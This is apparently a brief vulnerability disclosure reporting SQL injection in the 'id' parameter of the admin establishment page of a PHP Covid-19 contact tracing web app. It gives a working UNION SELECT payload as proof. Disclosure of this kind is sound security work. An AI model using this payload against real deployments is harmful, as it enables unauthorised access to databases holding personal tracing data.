# Covid-19 Contact Tracing System v1.0 has SQL injection

BUG_Author: TangJun

vendors: https://www.sourcecodester.com/php/14728/covid-19-contact-tracing-system-web-app-qr-code-scanning-using-php-source-code.html

Vulnerability url: /cts_qr/admin/establishment/manage.php?id.

Payload: id=-3 union all select null,null,concat(0x66676869,0x3536373839),null,null,null,null-- -

The union query succeeds, proving that SQL injection vulnerability exists

![image](https://github.com/BacteriaJun/cve/blob/main/sql.png)
